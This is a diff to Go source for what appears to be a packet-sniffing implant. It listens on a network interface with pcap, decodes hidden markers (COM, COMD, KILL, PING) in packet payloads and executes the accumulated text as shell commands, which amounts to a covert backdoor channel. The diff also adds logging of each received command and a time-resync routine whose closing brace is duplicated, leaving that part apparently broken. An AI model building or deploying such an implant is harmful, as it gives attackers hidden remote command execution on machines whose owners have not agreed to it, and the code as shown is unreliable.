@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"fmt"
 	"log"
-	_ "os"
 	"os/exec"
 	"strings"
 
@@ -13,7 +12,6 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
 )
-
 
 func StartSniffer(newAgent agent.Agent) {
 	msg := ""
@@ -27,16 +25,22 @@ func StartSniffer(newAgent agent.Agent) {
 		)
 
 		handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
-		if err != nil { log.Fatal(err) }
+		if err != nil {
+			log.Fatal(err)
+		}
 
 		defer handler.Close()
 
-		if err := handler.SetBPFFilter(filter); err != nil { log.Fatal(err) }
+		if err := handler.SetBPFFilter(filter); err != nil {
+			log.Fatal(err)
+		}
 
 		source := gopacket.NewPacketSource(handler, handler.LinkType())
 		for packet := range source.Packets() {
 			ret, cont := harvestInfo(packet)
-			if strings.Contains(cont, "COM") { msg += ret } 
+			if strings.Contains(cont, "COM") {
+				msg += ret
+			}
 
 			if cont == "COMD" {
 				runCommand(msg, newAgent)
@@ -58,7 +62,7 @@ func StartSniffer(newAgent agent.Agent) {
 func harvestInfo(packet gopacket.Packet) (string, string) {
 	ipLayer := packet.NetworkLayer()
 	ipLayerBytes := ipLayer.LayerContents()
-	srcIP := ipLayer.LayerContents()[len(ipLayerBytes)-8:len(ipLayerBytes)-4]
+	srcIP := ipLayer.LayerContents()[len(ipLayerBytes)-8 : len(ipLayerBytes)-4]
 	app := packet.ApplicationLayer()
 	if app != nil {
 		final := decode(app.LayerContents())
@@ -70,14 +74,15 @@ func harvestInfo(packet gopacket.Packet) (string, string) {
 		} else if strings.Contains(final, "KILL") {
 			return "", "KILL"
 		} else if strings.Contains(final, "PING") {
-			return string(srcIP), "PING" //TODO server auto pings agent if goes to MIA, hoping for change response
+			return string(srcIP), "PING" //TODO server auto pings agent if goes to MIA, hoping for change response. also updates NTP server information on box
 		}
 	}
 	return "ignore", "ignore"
 }
 
-
 func runCommand(msg string, newAgent agent.Agent) {
+	fmt.Print("Command: ")
+	fmt.Println(msg)
 	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()
 
 	if err != nil {
@@ -86,11 +91,26 @@ func runCommand(msg string, newAgent agent.Agent) {
 	}
 
 	fmt.Println(string(output))
-} 
+}
 
-func resync() {
-	
-} 
+func resync(newAgent agent.Agent) {
+	var command string
+	if newAgent.OpSys == "Windows" {
+		command = "w32tm /resync"
+	} else {
+		command = "echo resync time" //TODO actual linux command
+	}
+
+	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, command).Output()
+
+	if err != nil {
+		fmt.Println(err.Error())
+		fmt.Println("Couldn't execute command")
+	}
+
+	fmt.Println(string(output))
+	}
+}
 
 func decode(content []byte) string {
 	content = bytes.Trim(content, "\x00")
